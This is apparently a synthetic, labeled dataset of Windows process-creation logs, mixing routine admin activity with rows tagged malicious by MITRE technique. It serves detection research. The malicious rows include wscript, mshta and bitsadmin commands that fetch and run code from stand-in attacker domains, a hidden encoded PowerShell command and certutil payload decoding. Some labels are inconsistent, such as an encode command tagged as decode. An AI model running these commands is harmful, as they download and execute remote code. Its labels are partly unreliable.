UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-02T09:26:26.338Z,{8D04D153-5E98-4164-90A3-87B2EBB1A309},36560,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",31534,CORP\analyst02,Medium,0,,,benign
2024-07-05T17:02:55.074Z,{61B80997-E973-462C-AB63-984CE73B0C0B},13331,C:\Windows\System32\cmd.exe,cmd.exe /c gpupdate /force,C:\Windows\explorer.exe,C:\Windows\explorer.exe,53733,CORP\admin,High,0,,,benign
2024-07-03T08:47:04.560Z,{78586EEF-AF69-4649-861B-19C04E81ADF0},63383,C:\Windows\System32\certutil.exe,certutil.exe -dump C:\Certs\ca_cert.p7b,C:\Windows\System32\cmd.exe,cmd.exe,40471,CORP\sysadmin,High,0,,,gray_area
2024-07-02T19:56:27.160Z,{6D011AB9-4F72-403D-9F74-1B77ABB31093},4509,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,7636,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T16:18:01.514Z,{D482E590-C488-4E05-B255-EDE4E6FB9516},54291,C:\Windows\System32\cmd.exe,cmd.exe /c ipconfig /all,C:\Windows\explorer.exe,C:\Windows\explorer.exe,46734,CORP\dbadmin,Medium,0,,,benign
2024-07-01T07:05:09.015Z,{97CA00BD-A615-49EC-802C-6A61332B1BFE},33347,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,15233,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T14:05:48.432Z,{63904911-B6EB-4FF4-B011-8A822ED540CF},54149,C:\Windows\System32\certutil.exe,certutil.exe -verifystore My server8,C:\Windows\System32\cmd.exe,cmd.exe,25132,CORP\itops,High,0,,,gray_area
2024-07-04T13:46:50.321Z,{9B978AB7-F7DE-4A0C-8013-5DAA0198D9E8},29599,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",40728,CORP\jsmith,Medium,0,,,benign
2024-07-01T09:42:22.456Z,{3ACC9DAE-F856-4C86-A031-2E89D97A9721},16751,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,60277,CORP\itops,High,0,,,benign
2024-07-04T17:49:59.904Z,{8FF4C5B0-68F1-4985-8A26-A536FFE8AF08},59264,C:\Windows\System32\cmd.exe,cmd.exe /c nslookup corp.local,C:\Windows\explorer.exe,C:\Windows\explorer.exe,2025,CORP\jsmith,Medium,0,,,benign
2024-07-03T11:28:28.982Z,{58050888-72CF-49DC-9DEB-614A2F83E655},27023,C:\Windows\System32\dwm.exe,dwm.exe,C:\Windows\System32\smss.exe,smss.exe,1012,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T11:41:00.999Z,{8DFEE48F-4EB1-4C4F-8656-FA0EB3491725},11318,C:\Windows\System32\odbcad32.exe,odbcad32.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",6691,CORP\jsmith,Medium,0,,,benign
2024-07-01T21:23:40.912Z,{7B1DBCED-D4EE-45F0-B58C-61CDD908439E},55310,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",31129,CORP\analyst02,Medium,0,,,benign
2024-07-05T11:46:23.972Z,{46391331-B534-4F71-BED9-F3CC308FBE78},1922,C:\Users\sysadmin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,59458,CORP\sysadmin,High,0,,,benign
2024-07-05T12:58:35.120Z,{78283B2B-2FE9-4F42-AEE4-488B558B8F7C},18155,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,51788,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-03T15:28:28.691Z,{56C7D102-5F23-47A3-877A-16D1DEFF1347},15005,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",34500,CORP\netadmin,Medium,0,,,benign
2024-07-05T15:21:22.131Z,{0F9F69E1-1425-4B15-8071-D6743144E9F8},44994,C:\Windows\System32\mmc.exe,mmc.exe compmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,43957,CORP\itops,High,0,,,benign
2024-07-03T19:47:28.564Z,{94C871D8-1C62-4E02-AF24-1826ED15B471},47246,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",29028,CORP\analyst01,Medium,0,,,benign
2024-07-01T13:41:06.693Z,{91388240-180B-49FA-8C45-330CEC51FD9A},53432,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,11771,CORP\admin,High,0,,,benign
2024-07-04T16:50:43.370Z,{185A5564-A3AB-447A-B5F2-9DFB1DB99832},62848,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Common Files\System\Ole DB\oledb32.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,2950,CORP\sysadmin,High,0,,,gray_area
2024-07-04T09:13:34.848Z,{00B962B2-CE48-4FCA-AA68-2C49ED8EDE26},47054,C:\Windows\System32\mmc.exe,mmc.exe compmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,58582,CORP\itops,High,0,,,benign
2024-07-01T16:04:05.346Z,{C7D4C0D8-86A1-471D-96DD-A0C343640F4A},21631,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Common Files\System\Ole DB\oledb32.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,27322,CORP\admin,High,0,,,gray_area
2024-07-03T13:42:06.878Z,{57F5F1A2-0B35-4790-B438-7C7C23B0ED33},11539,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",22614,CORP\helpdesk,Medium,0,,,benign
2024-07-03T18:32:15.285Z,{8071C512-4BC0-476B-B202-B912717D4677},44842,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",32812,CORP\agarwal,Medium,0,,,benign
2024-07-01T01:29:22.159Z,{4F01935A-662C-465A-A7E3-5C23F142D820},10070,C:\Windows\System32\smss.exe,smss.exe,C:\Windows\System32\smss.exe,smss.exe,18366,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T16:42:40.634Z,{827C951F-19D1-4297-9A7F-82D23A1B391C},22966,C:\Program Files\Microsoft VS Code\Code.exe,Code.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",7120,CORP\mjones,Medium,0,,,benign
2024-07-01T17:12:37.558Z,{316B0F49-B278-4E3C-AD5E-A54BB82A9E35},12791,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,45676,CORP\jsmith,Medium,0,,,benign
2024-07-03T17:34:47.617Z,{E78AE72D-1AAF-4C8C-B6BD-9704228D4889},13875,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,51865,CORP\admin,High,0,,,benign
2024-07-01T16:27:26.096Z,{9AEABB02-3DE9-40FD-B533-99760E48A138},31451,C:\Windows\System32\certutil.exe,certutil.exe -verify -urlfetch C:\Certs\server18.cer,C:\Windows\System32\cmd.exe,cmd.exe,44309,CORP\itops,High,0,,,gray_area
2024-07-04T12:41:50.995Z,{CA41E893-DE78-4B4E-B542-108636BF0FFD},51866,C:\Windows\System32\cmd.exe,cmd.exe /c ipconfig /all,C:\Windows\explorer.exe,C:\Windows\explorer.exe,38910,CORP\netadmin,Medium,0,,,benign
2024-07-03T09:52:49.963Z,{D6BE0172-A6C6-472D-8B04-A722E278B089},33223,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://darkops2635.ru/script901.js,C:\Windows\System32\cmd.exe,cmd.exe /c,31873,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-01T13:56:08.487Z,{437D6260-6FF6-4146-ADFF-B255DCCEF5DE},15076,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb2547674.cab C:\Windows\SoftwareDistribution\Download\update_kb2547674.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,30239,NT AUTHORITY\SYSTEM,System,0,,,gray_area
2024-07-04T03:29:42.781Z,{6793FAD1-E0C6-49B2-9645-A57ADBBA21EB},36885,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\module824.csproj,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,12835,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-04T16:33:31.910Z,{BDE09C08-BAD8-4212-B5A5-5E26CD6F4AD2},62509,C:\Windows\System32\cmd.exe,cmd.exe /c net user,C:\Windows\explorer.exe,C:\Windows\explorer.exe,9794,CORP\pchen,Medium,0,,,benign
2024-07-05T15:15:54.230Z,{3FEBCA86-3691-4EDA-9DA0-A4AC46C29511},20709,C:\Windows\System32\cmd.exe,cmd.exe /c gpupdate /force,C:\Windows\explorer.exe,C:\Windows\explorer.exe,57199,CORP\mjones,Medium,0,,,benign
2024-07-05T16:25:05.357Z,{F188F58B-1F10-47F4-B91F-DF4254188077},15496,C:\Windows\System32\mmc.exe,mmc.exe devmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,58894,CORP\sysadmin,High,0,,,benign
2024-07-01T17:46:24.359Z,{25D4D865-4B24-4D9D-A593-39438582EBCD},64127,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,29140,CORP\admin,High,0,,,benign
2024-07-01T16:01:27.590Z,{69E70698-8E92-43B2-9CD4-8784AB7BD9D5},21699,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package15.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,37258,CORP\itops,High,0,,,gray_area
2024-07-02T13:25:14.912Z,{0C884D83-DAB9-473A-9DC7-B793CF67C809},51603,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,39640,CORP\itops,High,0,,,benign
2024-07-02T13:14:24.583Z,{8652F803-863A-468C-8F2C-1E31E38DBF3A},55615,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,17104,CORP\mjones,Medium,0,,,benign
2024-07-02T08:25:12.643Z,{E976C1EF-DBCF-45B6-B36E-9A79C39543FA},21024,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded9073.txt C:\Users\Public\decoded5453.exe,C:\Windows\System32\cmd.exe,cmd.exe,21560,CORP\agarwal,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-01T08:41:20.105Z,{48CD4603-9025-4258-AD25-645C060A2D81},47120,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,64467,CORP\sysadmin,High,0,,,benign
2024-07-05T12:10:46.702Z,{7DC9B548-ACF5-453D-A749-E7387DE6CC65},23457,C:\Windows\System32\odbcad32.exe,odbcad32.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",61447,CORP\netadmin,Medium,0,,,benign
2024-07-05T17:30:45.672Z,{A58589EC-1117-4C03-8291-2402C2CD5921},24808,C:\Users\sysadmin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,47918,CORP\sysadmin,High,0,,,benign
2024-07-03T19:09:04.129Z,{6B72DDBB-519F-47E6-BC1A-1B91523BAF8B},19023,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,41915,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T23:04:35.964Z,{20AF5327-F017-4FC6-878C-F501F42ADC19},59859,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,65096,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T22:30:40.186Z,{8009FEF8-DF2E-4F85-A61C-CDEA2CA18031},54182,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,9837,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-04T16:58:30.775Z,{6AFD99DB-24B5-4331-B30A-CC6D2EEAC47E},36226,C:\Windows\System32\cmd.exe,cmd.exe /c robocopy C:\Data D:\Backup /mir,C:\Windows\explorer.exe,C:\Windows\explorer.exe,53559,CORP\analyst01,Medium,0,,,benign
2024-07-03T12:04:34.481Z,{26D9A30C-1907-4DE0-8AEA-E10FAB92C0E1},12901,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,13595,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T12:17:11.026Z,{7A52A569-1145-44B6-8819-AE84B23C7E42},21897,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,40132,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T13:13:47.550Z,{D8B5BD32-C277-4B56-9CD4-7F31360E3506},14885,C:\Python311\python.exe,python.exe script.py,C:\Windows\System32\cmd.exe,cmd.exe,14356,CORP\klee,Medium,0,,,benign
2024-07-07T04:37:01.324Z,{29ECF114-F9B9-457D-A029-ED503031E35A},25755,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\svc346.csproj,C:\Windows\System32\cmd.exe,powershell.exe,38378,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-03T14:22:33.548Z,{4622A677-CAFA-4556-841C-D4F8E9C46B41},1637,C:\Windows\System32\odbcad32.exe,odbcad32.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",46928,CORP\klee,Medium,0,,,benign
2024-07-04T17:36:42.027Z,{7B715970-546F-4510-B02C-2EF396CBD81B},6501,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",43123,CORP\netadmin,Medium,0,,,benign
2024-07-04T13:15:21.993Z,{6721AE98-CEBF-420E-8BC6-4EEF3ACA6CA0},19229,C:\Users\sysadmin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,4299,CORP\sysadmin,High,0,,,benign
2024-07-02T19:16:42.083Z,{A8641EFD-01F0-4439-85E9-E4A5186F2CAE},11292,C:\Windows\explorer.exe,explorer.exe C:\Users\agarwal\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16719,CORP\agarwal,Medium,0,,,benign
2024-07-01T00:04:12.924Z,{3E720216-FDB4-4488-9041-D9AE78E4AE5A},43335,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,30060,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T11:41:32.409Z,{69D764DB-C4E9-4F92-9747-FDBB16DAB145},45532,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",65300,CORP\agarwal,Medium,0,,,benign
2024-07-05T03:32:08.652Z,{B5053151-D1C6-4F60-94C8-D9D9E2B7E9A0},54737,C:\Windows\System32\wuauclt.exe,wuauclt.exe /detectnow /updatenow,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,26844,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T19:38:32.393Z,{78A20565-ABB8-4BF8-ABE5-53CCBD6EB2D0},31324,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,39032,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T10:37:27.650Z,{FC7F9D98-7642-414D-835D-980907793C6A},54362,C:\Program Files\Microsoft VS Code\Code.exe,Code.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",33225,CORP\dbadmin,Medium,0,,,benign
2024-07-04T16:53:00.311Z,{FFF55108-8956-4B4F-A2EF-1A21DBD9AFD1},19803,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",14774,CORP\netadmin,Medium,0,,,benign
2024-07-02T17:36:41.664Z,{BCDEC698-6F20-4320-91E9-C37891C5C5EB},36287,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe --type=gpu-process,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",12438,CORP\netadmin,Low,0,,,benign
2024-07-03T08:58:49.091Z,{63256A7B-FF1A-439D-8C36-0341AEC38676},43749,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,38626,CORP\analyst01,Medium,0,,,benign
2024-07-03T08:08:47.431Z,{D4D5CD68-AD3A-4269-A226-FFBD2130625A},35477,C:\Program Files\Microsoft\Teams\current\Teams.exe,Teams.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",8448,CORP\analyst01,Medium,0,,,benign
2024-07-01T14:48:02.676Z,{2E87BCD8-F52A-4A14-9A25-09CFC676BFFE},61458,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,43039,CORP\sysadmin,High,0,,,gray_area
2024-07-03T08:10:47.546Z,{731248A6-495F-43F7-9E3F-E4D1161374C0},37902,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Downloads\patch.msi MD5,C:\Windows\System32\cmd.exe,cmd.exe,5583,CORP\itops,High,0,,,gray_area
2024-07-02T03:01:13.174Z,{80DB19E8-86B4-436B-86AD-AA7FDE4853BB},42824,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,20124,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T11:34:27.984Z,{3543E21B-3A1B-4442-B234-ABB8AB4C12DE},60735,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Downloads\patch.msi SHA1,C:\Windows\System32\cmd.exe,cmd.exe,37382,CORP\itops,High,0,,,gray_area
2024-07-03T03:47:29.229Z,{E662B569-946C-43D1-8568-3676350E5BE1},2758,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,52853,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-04T00:16:13.255Z,{60A81D32-0565-4FAD-9E2D-59E0EC8640DB},46427,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,5442,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T08:42:07.476Z,{2D3EAE9E-5F75-406D-970E-F70EF15D6AD7},21106,C:\Windows\System32\cmd.exe,cmd.exe /c net localgroup administrators,C:\Windows\explorer.exe,C:\Windows\explorer.exe,11467,CORP\sysadmin,High,0,,,benign
2024-07-04T01:33:42.692Z,{C93E2348-3FB8-4EFC-A13B-432A500E167B},6570,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job4861 /download /priority high http://dropper-srv7283.xyz/module418.exe C:\Users\Public\installer194.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,8813,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-05T08:50:23.718Z,{433B9D76-7C0D-476A-9EC0-1074D8682A9B},59687,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Disk | Get-Partition | Get-Volume""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,54234,CORP\mjones,Medium,0,,,benign
2024-07-05T12:46:53.572Z,{E2F19849-B6BD-4879-9003-BAEC90D16C1B},60966,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\agarwal\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",39203,CORP\agarwal,Medium,0,,,benign
2024-07-03T09:20:07.007Z,{E5448FB0-3624-4C1C-A121-05B85AA6850D},33596,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,49956,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T17:23:44.689Z,{10A7BCE9-C15D-46E2-9FB2-528925C10230},64120,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,46239,CORP\sysadmin,High,0,,,gray_area
2024-07-01T18:21:03.345Z,{A79F8EA2-5616-4B72-B364-DCB6F7FC57AA},52627,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://stager6379.net/script812.hta"""""")",C:\Windows\System32\cmd.exe,cmd.exe,48252,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-01T01:53:08.182Z,{B671BE8B-4617-4493-8B78-F93625F8677A},58245,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,3049,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T16:55:23.840Z,{BF85C016-B843-4C02-9982-76A43AA799B3},4683,C:\Users\sysadmin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,34768,CORP\sysadmin,High,0,,,benign
2024-07-02T01:27:38.266Z,{63E8066A-1F8A-435A-A74C-B149C6CD84AD},10781,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded476.exe C:\Users\Public\encoded439.txt,C:\Windows\System32\cmd.exe,cmd.exe,6836,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-01T11:14:44.898Z,{B179B3DC-90DD-47C8-8C07-9EF4C08EBF8F},23567,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Temp\update_4.0.86.msi /passive /norestart,C:\Windows\explorer.exe,C:\Windows\explorer.exe,21453,CORP\itops,High,0,,,benign
2024-07-01T17:53:42.308Z,{12681665-B66A-4D51-991D-4C75CC3B5AF3},33148,C:\Windows\System32\perfmon.exe,perfmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,52767,CORP\itops,High,0,,,benign
2024-07-01T01:37:50.707Z,{517B5CA0-CC96-415A-9946-5E8F10CD5345},32147,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,46115,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T11:33:58.810Z,{64F90951-C10B-479E-8675-723C3877D906},24674,C:\Windows\System32\perfmon.exe,perfmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,26434,CORP\admin,High,0,,,benign
2024-07-01T02:55:49.310Z,{9BB3C456-218B-4BB3-B985-4476A30EA859},58979,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job2051 /download http://beacon-drop299.com/files/installer902.exe C:\Users\Public\installer461.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,47272,CORP\klee,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-03T08:48:42.385Z,{9C64DEB8-0532-4458-BBCC-ABF9C5957AD1},56640,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,49370,CORP\mjones,Medium,0,,,benign
2024-07-04T03:34:22.987Z,{957361D0-54CD-4A8E-B919-6E918A75D16F},51484,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,14607,NT AUTHORITY\SYSTEM,System,0,,,benign
